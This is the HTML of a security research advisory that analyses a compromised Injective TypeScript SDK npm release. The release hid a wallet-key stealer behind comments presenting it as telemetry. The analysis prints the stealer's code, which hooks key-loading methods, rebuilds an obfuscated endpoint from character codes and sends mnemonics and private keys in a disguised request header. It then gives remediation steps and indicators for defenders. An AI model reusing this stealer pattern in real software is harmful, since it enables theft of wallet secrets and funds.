@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html data-html-server-rendered="true" lang="en" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22en%22%7D%7D">
+  <head>
+    <title>Injective SDK Compromise: Crypto Wallet Keys Stolen Through Fake Telemetry - JFrog Security Research</title><meta name="gridsome:hash" content="5fc52df7bbfb7085ac1ab9e6df1bc65527ece325"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.23"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="referrer" content="origin"><meta data-vue-tag="ssr" http-equiv="Content-Security-Policy" content="default-src *  &#x27;self&#x27; &#x27;unsafe-eval&#x27; &#x27;unsafe-inline&#x27;  https://jfrog.com; img-src &#x27;self&#x27; * data: ; font-src &#x27;self&#x27; * data: ;"><meta data-vue-tag="ssr" name="title" content="Injective SDK Compromise: Crypto Wallet Keys Stolen Through Fake Telemetry | JFrog"><meta data-vue-tag="ssr" name="description" content="Attackers compromised the official Injective TypeScript SDK release line and shipped a runtime wallet-key stealer disguised as key-derivation telemetry."><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="alternate" type="application/rss+xml" title="JFrog Security Research RSS" href="https://research.jfrog.com/rss.xml"><link data-vue-tag="ssr" rel="alternate" type="application/rss+xml" title="JFrog Security Real Time Posts RSS" href="https://research.jfrog.com/post/rss.xml"><link data-vue-tag="ssr" rel="alternate" type="application/rss+xml" title="JFrog Security Vulnerabilities RSS" href="https://research.jfrog.com/vulnerabilities/rss.xml"><link rel="preload" href="/assets/css/0.styles.63b6c696.css" as="style"><link rel="preload" href="/assets/js/app.dc22d57e.js" as="script"><link rel="preload" href="/assets/js/page--src--templates--real-time-post-vue.1e9339a1.js" as="script"><link rel="prefetch" href="/assets/js/page--src--pages--404-vue.77816cba.js"><link rel="prefetch" href="/assets/js/page--src--pages--index-vue.60e8bb75.js"><link rel="prefetch" href="/assets/js/page--src--pages--malicious-packages-vue.9729db36.js"><link rel="prefetch" href="/assets/js/page--src--pages--model-threats-vue.9d00f7fa.js"><link rel="prefetch" href="/assets/js/page--src--pages--oss-vue.09abfdb0.js"><link rel="prefetch" href="/assets/js/page--src--pages--post-vue.7c3f4a16.js"><link rel="prefetch" href="/assets/js/page--src--pages--vulnerabilities-vue.8862de61.js"><link rel="prefetch" href="/assets/js/page--src--templates--model-threats-post-vue.5c3697db.js"><link rel="prefetch" href="/assets/js/page--src--templates--post-vue.ed40c9f8.js"><link rel="prefetch" href="/assets/js/vendors~page--src--pages--index-vue.c55f7205.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--model-threats-post-vue~page--src--templates--real-time-post-vue.585feee1.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--real-time-post-vue.c9d248c6.js"><link rel="stylesheet" href="/assets/css/0.styles.63b6c696.css"><script data-vue-tag="ssr" type="text/javascript">(function(){try{var k='theme',d=document.documentElement,m=window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches,s=localStorage.getItem(k),t=s==='dark'||s==='light'?s:(m?'dark':'light');d.classList.toggle('dark',t==='dark');}catch(e){}})();</script><script data-vue-tag="ssr" src="/speedsize-local.js"></script><script data-vue-tag="ssr" src="https://transcend-cdn.com/cm/f0071674-c641-4cf3-9d31-303ec0c86b1b/airgap.js" data-languages="en" data-tracker-overrides="GoogleConsentMode:security_storage=on;ad_storage=SaleOfInfo,Advertising;ad_user_data=SaleOfInfo,Advertising;ad_personalization=SaleOfInfo,Advertising;analytics_storage=Analytics,SaleOfInfo;functionality_storage=Functional,SaleOfInfo;personalization_storage=Functional,SaleOfInfo" data-cfasync="false" type="text/javascript" charset="utf-8"></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8">
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+      gtag("config", "GTM-T6MF8M");
+      gtag('set', 'developer_id.dODQ2Mj', true);
+    </script><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
+  </head>
+  <body >
+    <div data-server-rendered="true" id="app" class="layout min-h-screen bg-white dark:bg-gray-900 transition-colors duration-200"><header class="py-2 main-header dark:bg-gray-900"><div class="container mx-auto px-2"><div class="flex w-full justify-between items-center"><div class="left flex-1 min-w-0"><div class="flex min-w-0 items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a><span class="site-name small truncate dark:text-gray-200">JFrog Security Research</span></div></div><div class="right flex-shrink-0"><div class="hidden sm:block desktop-menu-wrapper"><ul class="top-menu flex items-center"><li class="menu-item"><a href="/model-threats/" class="font-bold px-3 dark:text-gray-200">
+      Model Threats
+    </a><a href="/vulnerabilities/" class="font-bold px-3 mx-3 dark:text-gray-200">
+      Discover
+    </a></li><li class="flex items-center mr-2"><button type="button" aria-pressed="false" aria-label="Toggle dark mode" title="Toggle dark mode" class="theme-toggle ui-icon-button"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg></button></li><li><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noreferrer noopener noreferrer" class="sr-button px-3 py-2 inline-flex gap-2">
+  Follow JFrog Security
+  <img alt="twitter" src="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg" width="14" srcset="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg 14w" sizes="(max-width: 14px) 100vw, 14px" class="g-image"></a></li></ul></div><div class="sm:hidden flex mobile-menu-wrapper items-center"><!----><button type="button" aria-label="Open menu" aria-haspopup="dialog" aria-expanded="false" class="show-menu-hamburger ui-icon-button"><svg xmlns="http://www.w3.org/2000/svg" width="22" height="16" viewBox="0 0 22 16" fill="none" aria-hidden="true"><path d="M0 1C0 0.447715 0.447715 0 1 0H21C21.5523 0 22 0.447715 22 1C22 1.55228 21.5523 2 21 2H1C0.447716 2 0 1.55228 0 1Z" fill="currentColor"></path><path d="M0 8C0 7.44772 0.447715 7 1 7H21C21.5523 7 22 7.44772 22 8C22 8.55228 21.5523 9 21 9H1C0.447716 9 0 8.55228 0 8Z" fill="currentColor"></path><path d="M0 15C0 14.4477 0.447715 14 1 14H21C21.5523 14 22 14.4477 22 15C22 15.5523 21.5523 16 21 16H1C0.447716 16 0 15.5523 0 15Z" fill="currentColor"></path></svg></button></div></div></div></div><div class="fixed mobile-menu h-screen w-screen z-50 bg-white dark:bg-gray-900 text-gray-700 dark:text-gray-200 p-5 inset-0" style="display:none;"><div class="flex items-center justify-between gap-4 mb-3 pb-3 border-b border-gray-200 dark:border-gray-700"><div class="flex items-center gap-3"><span class="text-xs font-bold uppercase tracking-wide text-gray-500 dark:text-gray-400">Theme</span><button type="button" aria-pressed="false" aria-label="Toggle dark mode" title="Toggle dark mode" class="theme-toggle ui-icon-button"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg></button></div><button type="button" aria-label="Close menu" class="ui-icon-button"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 12 12" fill="none" aria-hidden="true"><path d="M1 1L11 11" stroke="currentColor" stroke-width="2"></path><path d="M11 1L1 11" stroke="currentColor" stroke-width="2"></path></svg></button></div><ul class="mobile-menu-list"><li class="py-4 px-2 border-t border-gray-200 dark:border-gray-600"><a href="/" class="text-gray-700 dark:text-gray-200 active">
+        Home
+      </a></li><li class="py-4 px-2 border-t border-gray-200 dark:border-gray-600"><a href="/model-threats/" class="text-gray-700 dark:text-gray-200">
+        Model Threats
+      </a></li><li class="py-4 px-2 border-t border-gray-200 dark:border-gray-600"><a href="/vulnerabilities/" class="text-gray-700 dark:text-gray-200">
+        Discover
+      </a></li><li class="py-4 px-2 border-t border-gray-200 dark:border-gray-600"><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noopener noreferrer" class="text-gray-700 dark:text-gray-200">
+        Follow JFrog Security
+      </a></li></ul></div></header><main><div class="latest-posts"><div class="container pt-5 pb-10"><h1 class="mt-3 pb-0">Injective SDK Compromise: Crypto Wallet Keys Stolen Through Fake Telemetry</h1><p class="mt-1 mb-5 green">Yair Benamou, JFrog Security Researcher | 12 Jul, 2026</p><div class="post-content-wrapper real-time-theme"><section class="latest-posts-single-post-content text-black dark:text-gray-200"><p>The JFrog Security Research team analyzed the compromised <code>@injectivelabs/sdk-ts</code> npm package version <code>1.20.21</code>, an official Injective Labs TypeScript SDK release that briefly shipped a wallet-key stealer. <code>@injectivelabs/sdk-ts</code> is used by JavaScript and TypeScript applications that interact with the Injective blockchain, including applications that create wallets, load private keys, and sign transactions.
+In our review, we found that the payload can run in more places than it first appears. Byte-key wallet wrappers can still <strong>leak full private keys</strong> after converting them to hex strings, and the compiled package keeps source-region comments that make static detection easier even though the original TypeScript source is not shipped. This also fits a broader shift we expect after npm v12, where install scripts are no longer enabled by default and attackers have more reason to move malicious logic into runtime code paths, as discussed in our <a href="https://jfrog.com/blog/npm-v12-from-implicit-to-explicit-trust/" target="_blank" rel="nofollow noopener noreferrer">npm v12 analysis</a>.</p>
+<p><img src="/img/RealTimePostImage/post/injective-sdk-supply-chain-attack.png"></p>
+<h2 id="affected-packages"><a href="#affected-packages" aria-hidden="true" tabindex="-1">Affected Packages</a></h2>
+<p>Only <code>@injectivelabs/sdk-ts@1.20.21</code> contains the malicious payload we analyzed. The other <code>@injectivelabs</code> packages in the same release wave do not appear to contain a copy of the stealer code themselves. They are affected because they were published at <code>1.20.21</code> with dependency relationships that pulled in the compromised SDK version. The full affected-package list appears in the IOCs section.</p>
+<p>The fixed release is <code>1.20.23</code>.</p>
+<h2 id="not-an-install-time-attack"><a href="#not-an-install-time-attack" aria-hidden="true" tabindex="-1">Not An Install-Time Attack</a></h2>
+<p>Many npm attacks run during package installation. This one did not. The package scripts look normal. The malicious code runs only when the SDK is used. With npm v12 reducing implicit trust in lifecycle scripts, runtime-triggered payloads like this become a more likely direction for attackers.</p>
+<p>The payload was added to the compiled account bundle:</p>
+<pre><code class="language-js">//#region src/utils/key-derivation-telemetry.ts
+/**
+* Key derivation telemetry — collects anonymized usage metrics for SDK optimization.
+*
+* Tracks which key derivation methods are used (hex vs mnemonic) and derives
+* timing patterns to help the SDK team identify performance bottlenecks and
+* understand adoption of different key formats across the ecosystem.
+*/
+</code></pre>
+<p>The comment is written to sound like normal product analytics. Underneath it, the implementation records the actual secret material.</p>
+<h2 id="where-the-payload-runs"><a href="#where-the-payload-runs" aria-hidden="true" tabindex="-1">Where The Payload Runs</a></h2>
+<p>The payload is triggered when code calls <code>PrivateKey.fromMnemonic()</code> or <code>PrivateKey.fromHex()</code>. These functions are used when an application loads a wallet from a mnemonic phrase or from a raw private key.</p>
+<p>The malicious addition is the call to <code>trackKeyDerivation()</code>, which receives the mnemonic or private key before the SDK continues with normal key creation.</p>
+<pre><code class="language-js">static fromMnemonic(words, path = DEFAULT_DERIVATION_PATH) {
+  trackKeyDerivation("fm", words);
+  return new PrivateKey(new Wallet(HDNodeWallet.fromPhrase(words, void 0, path).privateKey));
+}
+
+static fromHex(privateKey) {
+  trackKeyDerivation("fh", typeof privateKey === "string" ? privateKey : "bytes");
+  const isString = typeof privateKey === "string";
+  const privateKeyHex = isString &#x26;&#x26; privateKey.startsWith("0x") ? privateKey.slice(2) : privateKey;
+  return new PrivateKey(new Wallet(uint8ArrayToHex(isString ? hexToUint8Array(privateKeyHex.toString()) : privateKey)));
+}
+</code></pre>
+<p><code>PrivateKey.generate()</code> is affected as well, even though it is not patched directly. It creates a mnemonic and immediately calls <code>PrivateKey.fromMnemonic(mnemonic)</code>, so a freshly generated wallet can be queued for exfiltration before the caller receives the returned key object.</p>
+<p>One small but useful exception: the deprecated <code>PrivateKey.fromPrivateKey()</code> method constructs an <code>ethers.Wallet</code> directly and does not call <code>trackKeyDerivation()</code>. The attacker did not patch every constructor. They patched the modern paths most developers are likely to use.</p>
+<h2 id="sdk-calls-that-import-the-infected-privatekey"><a href="#sdk-calls-that-import-the-infected-privatekey" aria-hidden="true" tabindex="-1">SDK Calls That Import The Infected PrivateKey</a></h2>
+<p>The payload is only in the <code>PrivateKey</code> class inside the infected <code>accounts-jQ1GSgaW.js</code> bundle. We found other built SDK files that import this same <code>PrivateKey</code> class and then call its infected <code>fromHex()</code> method.</p>
+<p>The transaction broadcaster imports <code>PrivateKey</code> from the infected accounts bundle:</p>
+<pre><code class="language-js">import { S as createSignDoc, T as createSigners, b as createFee, n as PrivateKey, t as BaseAccount, v as createAuthInfo, y as createBody } from "./accounts-jQ1GSgaW.js";
+</code></pre>
+<p>Later, <code>MsgBroadcasterWithPk</code> calls <code>PrivateKey.fromHex()</code> when <code>options.privateKey</code> is not already a <code>PrivateKey</code> object:</p>
+<pre><code class="language-js">this.privateKey = options.privateKey instanceof PrivateKey
+  ? options.privateKey
+  : PrivateKey.fromHex(options.privateKey);
+</code></pre>
+<p>So a Node application using <code>MsgBroadcasterWithPk</code> with a raw private key can reach the infected method while creating the broadcaster.</p>
+<p>The CosmJS-compatible wallet wrapper file also imports <code>PrivateKey</code> from the same infected bundle:</p>
+<pre><code class="language-js">import { F as PublicKey, k as getPublicKey, n as PrivateKey } from "./accounts-jQ1GSgaW.js";
+</code></pre>
+<p>In that file, both <code>EthSecp256k1Wallet</code> and <code>DirectEthSecp256k1Wallet</code> convert a byte array private key to hex and call <code>PrivateKey.fromHex()</code>:</p>
+<pre><code class="language-js">static async fromKey(privKey, prefix = "inj") {
+  return new EthSecp256k1Wallet(
+    privKey,
+    PrivateKey.fromHex(uint8ArrayToHex(privKey)).toPublicKey().toPubKeyBytes(),
+    prefix
+  );
+}
+
+constructor(privKey, pubKey, prefix) {
+  this.privateKey = PrivateKey.fromHex(uint8ArrayToHex(privKey));
+  this.publicKey = PublicKey.fromBytes(pubKey);
+  this.prefix = prefix;
+}
+</code></pre>
+<p>The same pattern appears again in <code>DirectEthSecp256k1Wallet</code>.</p>
+<p>In these wrapper calls, the byte array is converted to a hex string before reaching <code>fromHex()</code>, so the full private key is passed to the infected method.</p>
+<h2 id="exfiltration-through-a-grpc-web-disguise"><a href="#exfiltration-through-a-grpc-web-disguise" aria-hidden="true" tabindex="-1">Exfiltration Through A gRPC-Web Disguise</a></h2>
+<p>The URL is hidden as character codes and rebuilt when the code runs:</p>
+<pre><code class="language-js">const _e = [
+  116, 101, 115, 116, 110, 101, 116, 46, 97, 114, 99, 104, 105, 118, 97, 108,
+  46, 99, 104, 97, 105, 110, 46, 103, 114, 112, 99, 45, 119, 101, 98, 46,
+  105, 110, 106, 101, 99, 116, 105, 118, 101, 46, 110, 101, 116, 119, 111,
+  114, 107
+];
+const _d = () => _e.map((x) => String.fromCharCode(x)).join("");
+const _ep = "https://" + _d() + "/";
+</code></pre>
+<p>The rebuilt endpoint is:</p>
+<pre><code class="language-text">hxxps://testnet[.]archival[.]chain[.]grpc-web[.]injective[.]network/
+</code></pre>
+<p>The stealer waits two seconds, groups the stolen values together, encodes them with base64, and sends them in an HTTP header:</p>
+<pre><code class="language-js">function trackKeyDerivation(method, value) {
+  _q.push(`${method}:${value}:${Date.now()}`);
+  _flush();
+}
+
+function _flush() {
+  if (_t) return;
+  _t = setTimeout(() => {
+    _t = null;
+    if (!_q.length) return;
+    _send(_enc(_q.join("|")));
+    _q = [];
+  }, 2e3);
+}
+</code></pre>
+<p>The request body is empty. The secret is carried in <code>X-Request-Id</code>, while the content type mimics the SDK's normal gRPC-Web traffic:</p>
+<pre><code class="language-js">fetch(_ep, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/grpc-web+proto",
+    "X-Request-Id": d
+  },
+  ...typeof window !== "undefined" ? { keepalive: true } : {}
+}).catch(() => {});
+</code></pre>
+<h2 id="the-header-choice"><a href="#the-header-choice" aria-hidden="true" tabindex="-1">The Header Choice</a></h2>
+<p>Putting the secret in <code>X-Request-Id</code> makes it easier to miss than putting it in the request body. Request IDs are often saved by proxies, API gateways, CDNs, and application logs for troubleshooting. If an affected environment logged the malicious request, the base64-encoded mnemonic or private key may have been copied into internal logs as well.</p>
+<p>A decoded header follows this structure:</p>
+<pre><code class="language-text">fm:&#x3C;mnemonic words>:&#x3C;timestamp>|fh:&#x3C;hex private key>:&#x3C;timestamp>
+</code></pre>
+<h2 id="remediation"><a href="#remediation" aria-hidden="true" tabindex="-1">Remediation</a></h2>
+<p>Any project that installed <code>@injectivelabs/sdk-ts@1.20.21</code>, or any <code>@injectivelabs/*@1.20.21</code> package that depended on it, should treat wallet secrets handled by that runtime as compromised.</p>
+<p>Recommended actions:</p>
+<ol>
+<li>Upgrade all affected <code>@injectivelabs</code> packages to <code>1.20.23</code> or later.</li>
+<li>Check lockfiles and package-manager caches for <code>@injectivelabs/sdk-ts</code> version <code>1.20.21</code>.</li>
+<li>Rotate any mnemonic or private key passed to the affected SDK version.</li>
+<li>Move funds from wallets whose mnemonic or private key may have been loaded or generated by the compromised version.</li>
+<li>Search egress and proxy logs for <code>testnet.archival.chain.grpc-web.injective.network</code>.</li>
+<li>Search logs for base64-looking <code>X-Request-Id</code> values on <code>application/grpc-web+proto</code> POST requests.</li>
+</ol>
+<p>JFrog Curation customers using an immaturity policy were fully protected from this attack, as all of the hijacked packages were flagged in less than 24 hours. Curation has an automatic compliance version selection (CVS) mechanism to ensure developer and CI/CD seamless fallback to compliant, non-malicious versions.</p>
+<h2 id="conclusions"><a href="#conclusions" aria-hidden="true" tabindex="-1">Conclusions</a></h2>
+<p>This attack shows that supply-chain malware does not need to be noisy to be dangerous. There is no install-time execution here, no persistence mechanism, and no broad host reconnaissance. The attacker placed a small hook in wallet key-loading code and waited for applications to hand it wallet secrets.</p>
+<p>The imported <code>PrivateKey</code> paths are worth paying attention to. Applications did not need to call <code>PrivateKey.fromMnemonic()</code> or <code>PrivateKey.fromHex()</code> explicitly to be exposed. Transaction broadcasting and CosmJS wallet wrapper flows also route through the compromised constructor, and byte-array private keys can be leaked once the SDK converts them to hex strings internally.</p>
+<h2 id="iocs"><a href="#iocs" aria-hidden="true" tabindex="-1">IOCs</a></h2>
+<h3 id="package-iocs"><a href="#package-iocs" aria-hidden="true" tabindex="-1">Package IOCs</a></h3>
+<table>
+<thead>
+<tr>
+<th align="left">Package</th>
+<th align="left">Affected version</th>
+<th align="left">Xray IDs</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left"><code>@injectivelabs/sdk-ts</code></td>
+<td align="left"><code>1.20.21</code></td>
+<td align="left">XRAY-1024734</td>
+</tr>
+<tr>
+<td align="left"><code>@injectivelabs/utils</code></td>
+<td align="left"><code>1.20.21</code></td>
+<td align="left">XRAY-1024741</td>
+</tr>
+<tr>
+<td align="left"><code>@injectivelabs/networks</code></td>
+<td align="left"><code>1.20.21</code></td>
+<td align="left">XRAY-1024740</td>
+</tr>
+<tr>
+<td align="left"><code>@injectivelabs/ts-types</code></td>
+<td align="left"><code>1.20.21</code></td>
+<td align="left">XRAY-1024736</td>
+</tr>
+<tr>
+<td align="left"><code>@injectivelabs/exceptions</code></td>
+<td align="left"><code>1.20.21</code></td>
+<td align="left">XRAY-1024733</td>
+</tr>
+<tr>
+<td align="left"><code>@injectivelabs/wallet-base</code></td>
+<td align="left"><code>1.20.21</code></td>
+<td align="left">XRAY-1024751</td>
+</tr>
+<tr>
+<td align="left"><code>@injectivelabs/wallet-core</code></td>
+<td align="left"><code>1.20.21</code></td>
+<td align="left">XRAY-1024748</td>
+</tr>
+<tr>
+<td align="left"><code>@injectivelabs/wallet-cosmos</code></td>
+<td align="left"><code>1.20.21</code></td>
+<td align="left">XRAY-1024735</td>
+</tr>
+<tr>
+<td align="left"><code>@injectivelabs/wallet-private-key</code></td>
+<td align="left"><code>1.20.21</code></td>
+<td align="left">XRAY-1024745</td>
+</tr>
+<tr>
+<td align="left"><code>@injectivelabs/wallet-evm</code></td>
+<td align="left"><code>1.20.21</code></td>
+<td align="left">XRAY-1024749</td>
+</tr>
+<tr>
+<td align="left"><code>@injectivelabs/wallet-trezor</code></td>
+<td align="left"><code>1.20.21</code></td>
+<td align="left">XRAY-1024737</td>
+</tr>
+<tr>
+<td align="left"><code>@injectivelabs/wallet-cosmostation</code></td>
+<td align="left"><code>1.20.21</code></td>
+<td align="left">XRAY-1024747</td>
+</tr>
+<tr>
+<td align="left"><code>@injectivelabs/wallet-ledger</code></td>
+<td align="left"><code>1.20.21</code></td>
+<td align="left">XRAY-1024744</td>
+</tr>
+<tr>
+<td align="left"><code>@injectivelabs/wallet-wallet-connect</code></td>
+<td align="left"><code>1.20.21</code></td>
+<td align="left">XRAY-1024746</td>
+</tr>
+<tr>
+<td align="left"><code>@injectivelabs/wallet-magic</code></td>
+<td align="left"><code>1.20.21</code></td>
+<td align="left">XRAY-1024739</td>
+</tr>
+<tr>
+<td align="left"><code>@injectivelabs/wallet-strategy</code></td>
+<td align="left"><code>1.20.21</code></td>
+<td align="left">XRAY-1024743</td>
+</tr>
+<tr>
+<td align="left"><code>@injectivelabs/wallet-turnkey</code></td>
+<td align="left"><code>1.20.21</code></td>
+<td align="left">XRAY-1024742</td>
+</tr>
+<tr>
+<td align="left"><code>@injectivelabs/wallet-cosmos-strategy</code></td>
+<td align="left"><code>1.20.21</code></td>
+<td align="left">XRAY-1024738</td>
+</tr>
+</tbody>
+</table>
+<h3 id="network-iocs"><a href="#network-iocs" aria-hidden="true" tabindex="-1">Network IOCs</a></h3>
+<pre><code class="language-text">testnet[.]archival[.]chain[.]grpc-web[.]injective[.]network
+hxxps://testnet[.]archival[.]chain[.]grpc-web[.]injective[.]network/
+</code></pre>
+<h3 id="behavioral-indicators"><a href="#behavioral-indicators" aria-hidden="true" tabindex="-1">Behavioral Indicators</a></h3>
+<pre><code class="language-text">PrivateKey.fromMnemonic() followed by POST to Injective-looking gRPC-Web endpoint
+PrivateKey.fromHex() followed by POST to Injective-looking gRPC-Web endpoint
+MsgBroadcasterWithPk constructed with raw privateKey followed by outbound POST
+EthSecp256k1Wallet.fromKey() or DirectEthSecp256k1Wallet.fromKey() followed by outbound POST
+Empty-body POST with high-entropy X-Request-Id header and Content-Type application/grpc-web+proto
+</code></pre>
+</section><!----></div></div></div></main><footer class="py-4 main-footer bg-black dark:bg-gray-950"><div class="container mx-auto px-2"><div class="flex w-full justify-center flex-col sm:flex-row sm:justify-between items-center flex-wrap gap-4"><div class="left"><div class="flex items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a></div></div><div class="right"><ul class="footer-menu flex flex-col sm:flex-row items-center"><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/terms-of-use/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Terms of Use
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/jfrog-cookies-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Cookies Policy
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/privacy-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Privacy Policy
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="#" rel="noopener noreferrer" target="_self" class="text-white ot-sdk-show-settings">
+              Cookies Settings
+            </a></li></ul></div></div><p class="sm:hidden text-center text-white pt-3">
+      ©2026 All Rights Reserved. JFrog Ltd.
+    </p></div></footer></div>
+    <script>window.__INITIAL_STATE__={"data":{"realTimePost":{"description":"Yair Benamou, JFrog Security Researcher","title":"Injective SDK Compromise: Crypto Wallet Keys Stolen Through Fake Telemetry","date":"July 12, 2026","type":"realTimePost","tag":"Real Time Post","img":"\u002Fimg\u002FRealTimePostImage\u002Fpost\u002Finjective-sdk-supply-chain-attack.png","path":"\u002Fpost\u002Finjective-sdk-supply-chain-attack\u002F","content":"\u003Cp\u003EThe JFrog Security Research team analyzed the compromised \u003Ccode\u003E@injectivelabs\u002Fsdk-ts\u003C\u002Fcode\u003E npm package version \u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E, an official Injective Labs TypeScript SDK release that briefly shipped a wallet-key stealer. \u003Ccode\u003E@injectivelabs\u002Fsdk-ts\u003C\u002Fcode\u003E is used by JavaScript and TypeScript applications that interact with the Injective blockchain, including applications that create wallets, load private keys, and sign transactions.\nIn our review, we found that the payload can run in more places than it first appears. Byte-key wallet wrappers can still \u003Cstrong\u003Eleak full private keys\u003C\u002Fstrong\u003E after converting them to hex strings, and the compiled package keeps source-region comments that make static detection easier even though the original TypeScript source is not shipped. This also fits a broader shift we expect after npm v12, where install scripts are no longer enabled by default and attackers have more reason to move malicious logic into runtime code paths, as discussed in our \u003Ca href=\"https:\u002F\u002Fjfrog.com\u002Fblog\u002Fnpm-v12-from-implicit-to-explicit-trust\u002F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003Enpm v12 analysis\u003C\u002Fa\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"\u002Fimg\u002FRealTimePostImage\u002Fpost\u002Finjective-sdk-supply-chain-attack.png\"\u003E\u003C\u002Fp\u003E\n\u003Ch2 id=\"affected-packages\"\u003E\u003Ca href=\"#affected-packages\" aria-hidden=\"true\" tabindex=\"-1\"\u003EAffected Packages\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EOnly \u003Ccode\u003E@injectivelabs\u002Fsdk-ts@1.20.21\u003C\u002Fcode\u003E contains the malicious payload we analyzed. The other \u003Ccode\u003E@injectivelabs\u003C\u002Fcode\u003E packages in the same release wave do not appear to contain a copy of the stealer code themselves. They are affected because they were published at \u003Ccode\u003E1.20.21\u003C\u002Fcode\u003E with dependency relationships that pulled in the compromised SDK version. The full affected-package list appears in the IOCs section.\u003C\u002Fp\u003E\n\u003Cp\u003EThe fixed release is \u003Ccode\u003E1.20.23\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\n\u003Ch2 id=\"not-an-install-time-attack\"\u003E\u003Ca href=\"#not-an-install-time-attack\" aria-hidden=\"true\" tabindex=\"-1\"\u003ENot An Install-Time Attack\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EMany npm attacks run during package installation. This one did not. The package scripts look normal. The malicious code runs only when the SDK is used. With npm v12 reducing implicit trust in lifecycle scripts, runtime-triggered payloads like this become a more likely direction for attackers.\u003C\u002Fp\u003E\n\u003Cp\u003EThe payload was added to the compiled account bundle:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-js\"\u003E\u002F\u002F#region src\u002Futils\u002Fkey-derivation-telemetry.ts\n\u002F**\n* Key derivation telemetry — collects anonymized usage metrics for SDK optimization.\n*\n* Tracks which key derivation methods are used (hex vs mnemonic) and derives\n* timing patterns to help the SDK team identify performance bottlenecks and\n* understand adoption of different key formats across the ecosystem.\n*\u002F\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe comment is written to sound like normal product analytics. Underneath it, the implementation records the actual secret material.\u003C\u002Fp\u003E\n\u003Ch2 id=\"where-the-payload-runs\"\u003E\u003Ca href=\"#where-the-payload-runs\" aria-hidden=\"true\" tabindex=\"-1\"\u003EWhere The Payload Runs\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EThe payload is triggered when code calls \u003Ccode\u003EPrivateKey.fromMnemonic()\u003C\u002Fcode\u003E or 